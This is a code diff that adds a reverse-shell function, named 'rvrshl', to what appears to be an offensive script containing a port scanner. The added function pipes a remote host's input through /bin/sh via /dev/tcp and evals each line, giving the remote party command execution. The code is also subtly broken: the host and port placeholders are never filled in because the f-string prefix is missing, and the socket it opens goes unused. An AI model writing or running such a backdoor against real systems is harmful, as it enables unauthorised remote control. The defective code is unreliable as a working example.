@@ -133,3 +133,16 @@ def prtscan(ip_address):
     for t in threads:
         t.join()
     return open_ports
+
+def rvrshl(ip_address, port):
+    try:
+        # Connect to the remote host
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip_address, port))
+    except socket.error:
+        print('Failed')
+        return
+
+    # Redirect stdin, stdout, and stderr to the socket
+    subprocess.run(['/bin/sh', '-i', '-c', 'exec 3<>/dev/tcp/{ip_address}/{port}; cat <&3 | while read line; do eval "$line" 2>&3; done'])
+    print('Success')
